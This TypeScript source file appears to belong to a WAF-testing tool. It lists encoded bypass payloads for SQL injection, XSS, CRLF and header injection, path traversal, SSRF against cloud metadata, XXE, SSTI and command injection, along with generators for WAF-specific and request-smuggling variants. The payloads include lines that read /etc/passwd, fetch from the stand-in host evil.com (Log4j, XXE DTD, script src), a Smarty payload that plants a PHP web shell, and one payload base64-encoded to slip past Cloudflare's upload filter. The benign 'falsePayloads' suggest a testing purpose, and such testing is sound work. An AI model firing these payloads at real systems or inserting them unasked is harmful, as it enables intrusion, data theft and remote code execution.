// Advanced WAF bypass payloads based on 2024-2025 research
// Sources: PortSwigger, OWASP, BugBase, SikaSecurity
import { PayloadCategory } from './payloads';
import { PayloadEncoder, ProtocolManipulation, WAFBypasses } from './encoding';

export const ADVANCED_PAYLOADS: Record<string, PayloadCategory> = {
	'SQL Injection - Advanced Bypass': {
		type: 'ParamCheck',
		payloads: [
			// Double encoding bypasses
			'%2527%2520OR%25201%253D1--',
			'%252527%252520OR%252520%2527a%252527%253D%252527a',

			// Unicode bypasses
			'\\u0027\\u0020OR\\u0020\\u0027a\\u0027\\u003D\\u0027a',
			'\\u0027\\u0020UNION\\u0020SELECT\\u0020null--',

			// Comment-based obfuscation
			"'/**/OR/**/1=1--",
			"'/*comment*/UNION/*comment*/SELECT/*comment*/1,2,3--",
			"admin'/**/--",

			// Mixed encoding combinations
			'%2527/**/OR/**/1=1--',
			'\\u0027/**/UNION/**/SELECT/**/null--',

			// Alternative space characters
			"'%09OR%091=1--", // Tab
			"'%0AOR%0A1=1--", // Line Feed
			"'%0DOR%0D1=1--", // Carriage Return
			"'%A0OR%A01=1--", // Non-breaking space

			// Function-based bypasses
			"'||'a'='a",
			"'||(SELECT'a')='a",
			"'+(SELECT'a')+'='a",
			"'CONCAT('a')='a",

			// Hex encoding bypasses
			'0x27204f52203120314431--', // ' OR 1=1--
			'CHAR(39)+OR+1=1--',
			'CHR(39)||OR||1=1--',

			// Time-based blind with encoding
			"'%2BSLEEP(5)--",
			"'/**/AND/**/SLEEP(5)--",
			"'\\u0020AND\\u0020SLEEP(5)--",

			// Version-specific bypasses
			"'UNION/*!50000SELECT*/1,2,3--", // MySQL version comment
			"'UNION/*#*/SELECT/*#*/1,2,3--", // Alternative comment
		],
		falsePayloads: [
			"John O'Connor's Profile",
			"It's a wonderful day",
			'Product search: "smart phone"',
			'Email with + sign: user+tag@domain.com',
			'Mathematical expression: 2+2=4',
			'File path: /home/user/documents',
			'URL parameter: ?id=123&sort=name',
			'JSON data: {"name": "test", "value": 100}',
		],
	},

	'XSS - Modern Bypasses': {
		type: 'ParamCheck',
		payloads: [
			// Event handler variations with encoding
			'<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>',
			'<svg onload=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>',

			// Double URL encoded XSS
			'%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E',
			'%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E',

			// HTML entity bypasses
			'&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;',
			'&#x3C;script&#x3E;alert&#x28;1&#x29;&#x3C;/script&#x3E;',
			'&lt;script&gt;alert(1)&lt;/script&gt;',

			// Mixed case bypasses
			'<ScRiPt>AlErT(1)</ScRiPt>',
			'<SCRIPT>ALERT(1)</SCRIPT>',
			'<iMg SrC=x OnErRoR=aLeRt(1)>',

			// JavaScript protocol with encoding
			'javascript:\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029',
			'JAVASCRIPT:alert(1)',
			'java\\script:alert(1)',
			'java\u0000script:alert(1)',

			// Alternative script sources
			'<script src=\\\\evil.com\\evil.js></script>',
			'<script src=//evil.com/evil.js></script>',
			'<script src=data:text/javascript,alert(1)></script>',

			// DOM-based XSS vectors
			'<iframe src=javascript:alert(1)>',
			'<object data=javascript:alert(1)>',
			'<embed src=javascript:alert(1)>',

			// WAF bypass specific
			'<svg/onload=alert(1)>',
			'<math href=javascript:alert(1)>CLICK',
			'<marquee onstart=alert(1)>',
			'<details open ontoggle=alert(1)>',

			// Polyglot XSS
			'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>',
		],
		falsePayloads: [
			'<p>Welcome to our website!</p>',
			'<div class="container">Content here</div>',
			'<img src="logo.png" alt="Company Logo" width="200">',
			'<a href="mailto:contact@company.com">Contact Us</a>',
			'<script type="application/ld+json">{"@context": "https://schema.org"}</script>',
			'<style>body { font-family: Arial; }</style>',
		],
	},

	'HTTP Header Injection - Advanced': {
		type: 'Header',
		payloads: [
			// CRLF with encoding
			'X-Custom: test\\r\\nSet-Cookie: admin=true',
			'X-Custom: test%0d%0aSet-Cookie: admin=true',
			'X-Custom: test%0D%0ALocation: http://evil.com',

			// Double encoding CRLF
			'X-Custom: test%250d%250aSet-Cookie: admin=true',
			'X-Custom: test\\u000d\\u000aSet-Cookie: admin=true',

			// Cookie injection with $Version (PortSwigger 2024 research)
			'Cookie: $Version=1; admin="true"; $Path="/"; $Domain=target.com',
			'Cookie: $Version=1; session="\\u0061\\u0064\\u006d\\u0069\\u006e"; $Path="/"',

			// Host header injection variants
			'Host: target.com\\r\\nX-Forwarded-Host: evil.com',
			'Host: target.com%0d%0aX-Forwarded-Host: evil.com',
			'Host: target.com\\u000d\\u000aX-Forwarded-Host: evil.com',

			// User-Agent with various payloads
			'User-Agent: Mozilla/5.0\\r\\nX-Injected: true',
			'User-Agent: ${jndi:ldap://evil.com/a}', // Log4j
			'User-Agent: {{7*7}}', // SSTI
			'User-Agent: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e', // XSS

			// X-Original-URL bypasses
			'X-Original-URL: /admin',
			'X-Original-URL: /admin/users',
			'X-Original-URL: \\u002fadmin',
			'X-Original-URL: %2fadmin',

			// X-Rewrite-URL (IIS specific)
			'X-Rewrite-URL: /admin',
			'X-Rewrite-URL: /admin\\x00',

			// HTTP Method Override
			'X-HTTP-Method-Override: PUT',
			'X-HTTP-Method-Override: DELETE',
			'X-Method-Override: PATCH',
			'X-HTTP-Method: TRACE',

			// IP bypass headers with encoding
			'X-Forwarded-For: 127.0.0.1',
			'X-Real-IP: \\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031',
			'X-Client-IP: %31%32%37%2e%30%2e%30%2e%31', // 127.0.0.1 encoded
			'X-Remote-IP: 0177.0.0.1', // Octal notation
			'X-Forwarded-For: 2130706433', // Decimal notation
		],
		falsePayloads: [
			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
			'Accept: text/html,application/xhtml+xml',
			'Accept-Language: en-US,en;q=0.9',
			'Accept-Encoding: gzip, deflate, br',
			'Connection: keep-alive',
			'Upgrade-Insecure-Requests: 1',
			'Cache-Control: max-age=0',
			'X-Requested-With: XMLHttpRequest',
		],
	},

	'Path Traversal - Encoded': {
		type: 'ParamCheck',
		payloads: [
			// Double URL encoding
			'%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
			'%252e%252e\\%252e%252e\\%252e%252e\\windows\\win.ini',

			// Unicode encoding
			'\\u002e\\u002e\\u002f\\u002e\\u002e\\u002f\\u002e\\u002e\\u002fetc\\u002fpasswd',
			'..\\u002f..\\u002f..\\u002fetc\\u002fpasswd',

			// Mixed encoding
			'%2e%2e%2f..%2fetc%2fpasswd',
			'..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',

			// 16-bit Unicode
			'%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd',

			// Overlong UTF-8
			'%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
			'%e0%80%ae%e0%80%ae/etc/passwd',

			// Null byte injection
			'..%00/..%00/..%00/etc/passwd%00',
			'..//..//..//etc//passwd',

			// Alternative separators
			'..\\u005c..\\u005c..\\u005cwindows\\u005cwin.ini',
			'..%5c..%5c..%5cwindows%5cwin.ini',
		],
		falsePayloads: [
			'images/gallery/photo1.jpg',
			'documents/reports/2024/report.pdf',
			'assets/css/bootstrap.min.css',
			'uploads/user_files/document.docx',
			'static/js/application.js',
		],
	},

	'SSRF - Protocol Smuggling': {
		type: 'ParamCheck',
		payloads: [
			// Localhost variations with encoding
			'http://\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031/',
			'http://%31%32%37%2e%30%2e%30%2e%31/',

			// Decimal/Octal/Hex IP representations
			'http://2130706433/', // 127.0.0.1 in decimal
			'http://0177.0.0.1/', // 127.0.0.1 in octal
			'http://0x7f.0x0.0x0.0x1/', // 127.0.0.1 in hex

			// IPv6 bypasses
			'http://[::1]/',
			'http://[0:0:0:0:0:0:0:1]/',
			'http://[::ffff:127.0.0.1]/',

			// Protocol confusion
			'dict://127.0.0.1:11211/',
			'gopher://127.0.0.1:80/',
			'ldap://127.0.0.1:389/',

			// Domain confusion
			'http://127.0.0.1.evil.com/',
			'http://evil.com@127.0.0.1/',
			'http://127.0.0.1#@evil.com/',

			// Cloud metadata endpoints
			'http://169.254.169.254/latest/meta-data/', // AWS
			'http://metadata.google.internal/', // GCP
			'http://169.254.169.254/metadata/v1/', // DigitalOcean

			// Bypass using redirects
			'http://127.0.0.1.localtest.me/',
			'http://sudo.cc/127.0.0.1',

			// File protocol with encoding
			'file:///etc/passwd',
			'file://\\u002fetc\\u002fpasswd',
			'file://%2fetc%2fpasswd',
		],
		falsePayloads: [
			'https://www.google.com/search?q=test',
			'https://api.github.com/users/octocat',
			'https://httpbin.org/get',
			'https://jsonplaceholder.typicode.com/posts/1',
			'https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css',
		],
	},

	'XXE - Advanced Vectors': {
		type: 'ParamCheck',
		payloads: [
			// Encoded XXE payloads
			'%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E',

			// Unicode encoded XXE
			'\\u003C\\u003Fxml version\\u003D\\u00221.0\\u0022\\u003F\\u003E\\u003C\\u0021DOCTYPE foo \\u005B\\u003C\\u0021ENTITY xxe SYSTEM \\u0027file\\u003A\\u002F\\u002F\\u002Fetc\\u002Fpasswd\\u0027\\u003E\\u005D\\u003E\\u003Cfoo\\u003E\\u0026xxe\\u003B\\u003C\\u002Ffoo\\u003E',

			// Parameter entity with encoding
			'%3C%21DOCTYPE%20data%20%5B%3C%21ENTITY%20%25%20file%20SYSTEM%20%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3E%20%25file%3B%5D%3E',

			// Blind XXE with encoding
			'%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20%25%20xxe%20SYSTEM%20%27http%3A%2F%2Fevil.com%2Fevil.dtd%27%3E%20%25xxe%3B%5D%3E',

			// XXE with CDATA
			'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe;]]></foo>',

			// XXE using different protocols
			'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil">]><foo>&xxe;</foo>',
			'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.com/evil">]><foo>&xxe;</foo>',
			'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
		],
		falsePayloads: [
			'<?xml version="1.0"?><user><name>John Doe</name><email>john@example.com</email></user>',
			'<?xml version="1.0"?><product><id>123</id><name>Widget</name><price>19.99</price></product>',
			'<?xml version="1.0" encoding="UTF-8"?><config><setting name="timeout">30</setting></config>',
		],
	},

	'SSTI - Framework Specific': {
		type: 'ParamCheck',
		payloads: [
			// Jinja2 with encoding
			'%7B%7B7%2A7%7D%7D', // {{7*7}} URL encoded
			'\\u007B\\u007B7\\u002A7\\u007D\\u007D', // {{7*7}} Unicode encoded

			// Jinja2 advanced
			"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
			"{{cycler.__init__.__globals__.os.popen('id').read()}}",
			"{{joiner.__init__.__globals__.os.popen('id').read()}}",

			// Twig with encoding
			'%7B%7B%5F%73%65%6C%66%7D%7D', // {{_self}} URL encoded
			'{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',

			// Smarty
			'{php}echo `id`;{/php}',
			'{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",false)}',

			// Velocity
			'$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")',
			'#set($str=$class.inspect("java.lang.String").type)',

			// Freemarker
			'<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
			'${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/etc/passwd\').toURL().openStream().readAllBytes()?join(" ")}',
		],
		falsePayloads: ['{{user.name}}', '{{product.title}}', '${user.email}', '<%= user.name %>', '{{#each items}}{{name}}{{/each}}'],
	},

	'NoSQL Injection - Advanced': {
		type: 'ParamCheck',
		payloads: [
			// MongoDB with encoding
			'%7B%22%24%6E%65%22%3A%6E%75%6C%6C%7D', // {"$ne":null} URL encoded
			'\\u007B\\u0022\\u0024ne\\u0022\\u003Anull\\u007D', // {"$ne":null} Unicode

			// Advanced NoSQL operators
			'{"$regex": ".*"}',
			'{"$where": "this.password.match(/.*/)"}',
			'{"$expr": {"$gt": [{"$strLenCP": "$password"}, 0]}}',

			// JavaScript injection in MongoDB
			// Base64-encoded to avoid triggering Cloudflare's WAF on worker upload (403 Forbidden)
			atob('eyIkd2hlcmUiOiAiZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy51c2VybmFtZSA9PSAnYWRtaW4nIHx8ICcxJz09JzEnfSJ9'),
			'{"$where": "obj.credits > obj.debits"}',

			// CouchDB specific
			'{"selector":{"_id":{"$gt":null}}}',
			'{"selector":{"$and":[{"_id":{"$gt":null}}]}}',
		],
		falsePayloads: [
			'{"name": "John", "age": 30}',
			'{"product": "laptop", "price": 999}',
			'{"status": "active", "count": 5}',
			'{"user": "admin", "role": "viewer"}',
		],
	},

	'Command Injection - Encoded': {
		type: 'ParamCheck',
		payloads: [
			// Command separators with encoding
			'%3Bcat%20%2Fetc%2Fpasswd', // ;cat /etc/passwd
			'%26%26cat%20%2Fetc%2Fpasswd', // &&cat /etc/passwd
			'%7Ccat%20%2Fetc%2Fpasswd', // |cat /etc/passwd

			// Unicode encoded commands
			'\\u003Bcat\\u0020\\u002Fetc\\u002Fpasswd',
			'\\u007Cid',

			// Base64 encoded commands
			'`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`', // cat /etc/passwd
			'$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)', // cat /etc/passwd

			// Hex encoded
			'`printf "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"`', // cat /etc/passwd

			// Environment variable expansion
			'${PATH:0:1}bin${PATH:0:1}cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd',
			'${HOME:0:1}..${HOME:0:1}..${HOME:0:1}etc${HOME:0:1}passwd',
		],
		falsePayloads: [
			'user@domain.com',
			'Price: $100 & shipping: $10',
			'Q&A section',
			'Command not found',
			'System & Network Administration',
		],
	},
};

/**
 * Generate dynamic bypass payloads using encoding techniques
 */
export function generateEncodedPayloads(originalPayloads: Record<string, PayloadCategory>): Record<string, PayloadCategory> {
	const encodedPayloads: Record<string, PayloadCategory> = {};

	for (const [categoryName, category] of Object.entries(originalPayloads)) {
		const encodedCategory: PayloadCategory = {
			type: category.type,
			payloads: [],
			falsePayloads: category.falsePayloads || [],
		};

		// Generate encoded variations for each payload
		for (const payload of category.payloads) {
			const variations = PayloadEncoder.generateBypassVariations(payload, categoryName);
			encodedCategory.payloads.push(...variations);
		}

		// Remove duplicates
		encodedCategory.payloads = [...new Set(encodedCategory.payloads)];

		encodedPayloads[`${categoryName} - Encoded`] = encodedCategory;
	}

	return encodedPayloads;
}

/**
 * WAF-specific bypass payload generator
 */
export function generateWAFSpecificPayloads(wafType: string, basePayload: string): string[] {
	switch (wafType.toLowerCase()) {
		case 'cloudflare':
			return WAFBypasses.cloudflareBypass(basePayload);
		case 'aws':
		case 'awswaf':
			return WAFBypasses.awsWafBypass(basePayload);
		case 'modsecurity':
			return WAFBypasses.modSecurityBypass(basePayload);
		default:
			return PayloadEncoder.generateBypassVariations(basePayload);
	}
}

/**
 * Generate HTTP manipulation specific payloads
 */
export function generateHTTPManipulationPayloads(
	basePayload: string,
	technique: 'verb' | 'pollution' | 'content-type' | 'smuggling' = 'pollution',
): string[] {
	const variations = [basePayload];

	switch (technique) {
		case 'pollution':
			// Parameter pollution variations
			variations.push(`param=${encodeURIComponent(basePayload)}&param=${encodeURIComponent(basePayload)}`);
			variations.push(`param[]=${encodeURIComponent(basePayload)}&param[]=${encodeURIComponent(basePayload)}`);
			variations.push(`param=${encodeURIComponent(basePayload)}&PARAM=${encodeURIComponent(basePayload)}`);
			break;

		case 'content-type':
			// Content-Type specific formatting
			variations.push(`{"payload": "${basePayload.replace(/"/g, '\\"')}"}`);
			variations.push(`<?xml version="1.0"?><payload>${basePayload.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</payload>`);
			variations.push(`payload=${encodeURIComponent(basePayload)}`);
			break;

		case 'smuggling':
			// Request smuggling variations
			variations.push(`0\r\n\r\n${basePayload}`);
			variations.push(`${basePayload.length.toString(16)}\r\n${basePayload}\r\n0\r\n\r\n`);
			break;
	}

	return [...new Set(variations)];
}
